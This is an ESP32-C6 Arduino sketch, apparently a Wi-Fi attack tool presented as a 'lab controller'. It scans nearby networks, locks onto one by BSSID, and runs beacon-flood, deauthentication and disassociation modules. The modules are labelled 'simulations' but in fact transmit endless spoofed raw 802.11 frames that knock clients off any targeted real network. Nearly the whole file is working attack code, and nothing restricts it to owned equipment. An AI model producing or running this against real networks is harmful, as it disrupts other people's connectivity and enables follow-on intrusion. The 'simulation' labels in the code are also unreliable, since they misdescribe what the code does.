#include "esp_wifi.h"
#include "WiFi.h"

// --- Global Target Parameters ---
// These will be updated dynamically when you select a network from the scanner
String targetSSID = "None";
uint8_t targetMAC[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int targetChannel = 1;
bool hasTarget = false;

// --- Helper: Parse MAC Address String to Raw Bytes ---
void parseMacAddress(String macStr, uint8_t* macBytes) {
  int bytes[6];
  if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &bytes[0], &bytes[1], &bytes[2], &bytes[3], &bytes[4], &bytes[5]) == 6) {
    for (int i = 0; i < 6; ++i) {
      macBytes[i] = (uint8_t)bytes[i];
    }
  }
}

// --- Menu UI Display ---
void printInterfaceMenu() {
  Serial.println("\n==========================================");
  Serial.println("     ESP32-C6 WIRELESS LAB CONTROLLER     ");
  Serial.println("==========================================");
  Serial.print("  [Active Target]: ");
  if (hasTarget) {
    Serial.print(targetSSID);
    Serial.print(" [Ch: "); Serial.print(targetChannel);
    Serial.print("] (MAC: ");
    for(int i=0; i<6; i++) {
      if(targetMAC[i] < 0x10) Serial.print("0");
      Serial.print(targetMAC[i], HEX);
      if(i < 5) Serial.print(":");
    }
    Serial.println(")");
  } else {
    Serial.println("NONE (Run network discovery first)");
  }
  Serial.println("------------------------------------------");
  Serial.println(" [1] Run Network Discovery Environment Scan");
  Serial.println(" [2] Launch Beacon Flood Simulation");
  Serial.println(" [3] Launch Deauthentication Simulation");
  Serial.println(" [4] Launch Disassociation Simulation");
  Serial.println(" [M] Reprint Option Menu Layout");
  Serial.println("==========================================");
  Serial.print("Select execution module (1-4): ");
}

void setup() {
  Serial.begin(115200);
  
  // Ensure USB CDC pipeline opens on ESP32-C6 before executing prints
  while (!Serial) {
    delay(10); 
  }

  // Initialize raw internal Wi-Fi stack components
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  printInterfaceMenu();
}

void loop() {
  if (Serial.available() > 0) {
    char selection = Serial.read();
    
    // Clear out trailing newline/carriage buffer contents
    while(Serial.available() > 0) { Serial.read(); }

    switch (selection) {
      case '1':
        executeNetworkDiscovery();
        break;
      case '2':
        executeBeaconFloodSimulation();
        break;
      case '3':
        executeDeauthSimulation();
        break;
      case '4':
        executeDisassocSimulation();
        break;
      case 'm':
      case 'M':
        printInterfaceMenu();
        break;
      default:
        Serial.println("\n[!] Invalid selection option. Type 'M' to show menu.");
        break;
    }
  }
}

// --- Module 1: Environment Scan & Target Locking ---
void executeNetworkDiscovery() {
  Serial.println("\n[*] Initializing 2.4 GHz Environment Discovery...");
  int foundNetworks = WiFi.scanNetworks();
  
  if (foundNetworks == 0) {
    Serial.println("[-] No available Wi-Fi test networks discovered.");
    printInterfaceMenu();
    return;
  }
  
  Serial.print("[+] Discovered ");
  Serial.print(foundNetworks);
  Serial.println(" networks:");
  
  for (int i = 0; i < foundNetworks; ++i) {
    Serial.print("  ["); Serial.print(i + 1); Serial.print("] ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (Signal: "); Serial.print(WiFi.RSSI(i)); Serial.print(" dBm)");
    Serial.print(" [Ch: "); Serial.print(WiFi.channel(i)); Serial.print("]");
    Serial.print(" MAC: "); Serial.println(WiFi.BSSIDstr(i));
  }

  Serial.println("\n--> Select target index number to lock parameters (or '0' to skip): ");
  
  // Wait indefinitely for user to select a target from the list
  while (Serial.available() == 0) { delay(10); }
  
  int targetIndex = Serial.parseInt();
  while(Serial.available() > 0) { Serial.read(); } // flush buffer

  if (targetIndex > 0 && targetIndex <= foundNetworks) {
    int idx = targetIndex - 1;
    targetSSID = WiFi.SSID(idx);
    targetChannel = WiFi.channel(idx);
    parseMacAddress(WiFi.BSSIDstr(idx), targetMAC);
    hasTarget = true;
    Serial.println("\n[+] Target locked successfully!");
  } else {
    Serial.println("\n[-] Target selection bypassed.");
  }
  
  printInterfaceMenu();
}

// --- Module 2: Beacon Flood Simulator ---
void executeBeaconFloodSimulation() {
  Serial.println("\n[*] Initializing Beacon Flood Engine...");
  Serial.println("[i] Simulating dense deployment environments by generating fake network management beacons.");
  Serial.println("[!] Press the manual physical EN/RST button on your ESP32-C6 to abort operation.");
  
  uint32_t frameCount = 0;
  uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  String dummySSID = "Simulated_Lab_Net";
  int ssidLen = dummySSID.length();

  // Fix physical radio channel allocation context
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  while(true) {
    // Generate pseudorandom unique physical layer MAC identities for every iteration
    uint8_t randomAPMac[6] = {0x00, 0x16, 0x3E, (uint8_t)random(0,255), (uint8_t)random(0,255), (uint8_t)random(0,255)};
    
    // Assemble 24-byte IEEE 802.11 Layer-2 Base Management Structure
    uint8_t frameHeader[24] = {
      0x80, 0x00,                         // Frame Type: Beacon Frame
      0x00, 0x00,                         // Duration Parameter
      0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast Address)
      randomAPMac[0], randomAPMac[1], randomAPMac[2], randomAPMac[3], randomAPMac[4], randomAPMac[5], // Source Routing
      randomAPMac[0], randomAPMac[1], randomAPMac[2], randomAPMac[3], randomAPMac[4], randomAPMac[5], // BSSID Identity
      0x00, 0x00                          // Sequence Tracker Control
    };

    uint8_t managementParams[12] = {
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // System Precision Timestamp
      0x64, 0x00,                                     // Interval Parameter Timing Window
      0x11, 0x04                                      // Capacity Structural Flag Indicators
    };

    uint8_t rateParameters[10] = {0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C};

    // Calculate dynamic payload distribution footprints
    int totalBufferSize = 24 + 12 + 2 + ssidLen + 10;
    uint8_t* txBuffer = new uint8_t[totalBufferSize];

    int cursor = 0;
    memcpy(txBuffer + cursor, frameHeader, 24);        cursor += 24;
    memcpy(txBuffer + cursor, managementParams, 12);  cursor += 12;
    
    // Append Element Parameter Segment (SSID Tag)
    txBuffer[cursor++] = 0x00; 
    txBuffer[cursor++] = ssidLen;
    memcpy(txBuffer + cursor, dummySSID.c_str(), ssidLen); cursor += ssidLen;

    // Append Operational Rates Tag Segment
    memcpy(txBuffer + cursor, rateParameters, 10);

    // Pass structured binary stream array pointers straight down into airwaves interface layers
    esp_wifi_80211_tx(WIFI_IF_STA, txBuffer, totalBufferSize, true);
    delete[] txBuffer;

    frameCount++;
    if (frameCount % 100 == 0) {
      Serial.print("\r\n[+] Airwave Injection Count: "); Serial.print(frameCount); Serial.flush();
    }
    delay(10); // Throttle frequency parameters to prevent internal component core stalls
  }
}

// --- Module 3: Deauthentication Framework ---
void executeDeauthSimulation() {
  if (!hasTarget) {
    Serial.println("\n[!] Error: No targeted lab network active. Lock a target configuration selection first.");
    printInterfaceMenu();
    return;
  }

  Serial.println("\n[*] Initializing Deauthentication Frame Pipeline...");
  Serial.println("[!] Injecting authorization management overrides onto environment channels.");
  Serial.println("[!] Press the physical EN/RST button on your ESP32-C6 hardware panel layout to drop process.");

  // Force system radio loop core context tracking paths onto target channel variables
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  uint8_t broadcastTarget[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  uint32_t injectionCounter = 0;

  // 24-byte IEEE 802.11 Layer-2 Management Structure Layout + 2-byte reason payload
  uint8_t deauthPacket[26] = {
    0xC0, 0x00,                         // Management Category Frame Control: Subtype Deauth
    0x00, 0x00,                         // Duration Matrix Field
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast Target Routing 
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Spoofed AP Source Address
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // BSSID Validation Address Map
    0x00, 0x00,                         // Sequence Verification Flag
    0x07, 0x00                          // Reason Code: Class 3 Framework Exception Context (Nonassociated STA)
  };

  while (true) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), true);
    injectionCounter++;
    
    if (injectionCounter % 50 == 0) {
      Serial.print("\r[+] Total Transmitted Deauth Disconnect Packets: "); Serial.print(injectionCounter); Serial.flush();
    }
    delay(5); // Internal balancing protection structure delay tracking windows
  }
}

// --- Module 4: Disassociation Framework ---
void executeDisassocSimulation() {
  if (!hasTarget) {
    Serial.println("\n[!] Error: No targeted lab network active. Lock a target configuration selection first.");
    printInterfaceMenu();
    return;
  }

  Serial.println("\n[*] Initializing Disassociation Frame Pipeline...");
  Serial.println("[!] Injecting state clearing vectors directly onto airwave environment channels.");
  Serial.println("[!] Press the physical EN/RST button on your ESP32-C6 hardware panel layout to drop process.");

  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

  uint32_t injectionCounter = 0;

  // 24-byte Header Layout + 2-byte reason payload
  uint8_t disassocPacket[26] = {
    0xA0, 0x00,                         // Management Category Frame Control: Subtype Disassociation
    0x00, 0x00,                         // Duration Matrix Field
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target Routing (Broadcast)
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Spoofed Source
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // BSSID
    0x00, 0x00,                         // Sequence Verification Flag
    0x06, 0x00                          // Reason Code: Class 2 Framework Exception Context (Nonauthenticated STA)
  };

  while (true) {
    esp_wifi_80211_tx(WIFI_IF_STA, disassocPacket, sizeof(disassocPacket), true);
    injectionCounter++;
    if (injectionCounter % 50 == 0) {
      Serial.print("\r[+] Total Transmitted Disassoc Disconnect Packets: "); 
      Serial.print(injectionCounter); Serial.flush();
    }
    delay(5);
  }
}
